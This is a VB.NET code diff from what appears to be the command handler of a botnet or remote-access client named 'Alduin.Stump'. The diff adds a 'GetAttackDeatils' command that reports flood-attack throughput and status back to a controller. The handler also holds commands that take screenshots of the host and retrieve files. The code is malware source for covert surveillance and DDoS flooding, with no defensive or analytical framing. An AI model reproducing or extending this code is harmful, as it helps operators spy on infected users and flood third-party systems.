@@ -164,6 +164,13 @@ Namespace Alduin.Stump.Class.Commands
                 Case "Ads"
                     Dim ModelDes As AdsModel = JsonConvert.DeserializeAnonymousType(request, New AdsModel)
                     Return JsonConvert.SerializeObject(ExecuteCommand.AddAds(ModelDes))
+                Case "GetAttackDeatils"
+                    Dim log As LogModel = New LogModel With {
+                            .Message = GetFloodsBase().GetAttackDownStrengOnByteOnSec() & "/" & GetFloodsBase().GetAttackUpStrengOnByteOnSec() & "/" & GetFloodsBase().GetMessage(),
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Success"
+                         }
+                    Return JsonConvert.SerializeObject(log)
             End Select
             Dim splittedHeader As String = RequestSplitter(request, 1, " ")
             Dim url As String = RequestSplitter(splittedHeader, 0, "?")
@@ -175,7 +182,7 @@ Namespace Alduin.Stump.Class.Commands
                 Case "GetScreenShot"
                     StreamWriterImg(TakeScreenShot.TakeScreenShot(), client)
                     Dim log As LogModel = New LogModel With {
-                            .Message = GetFloodsBase().GetMessage(),
+                            .Message = "",
                             .KeyUnique = GetConfigJson().KeyUnique,
                             .Type = "Success"
                     }
@@ -186,7 +193,6 @@ Namespace Alduin.Stump.Class.Commands
                 Case "GetFile"
                     GetImg.Handler(Attr, client)
                     Return ""
-
             End Select
             Dim invalidcommandlog As LogModel = New LogModel With {
                             .Message = "Invalid command",
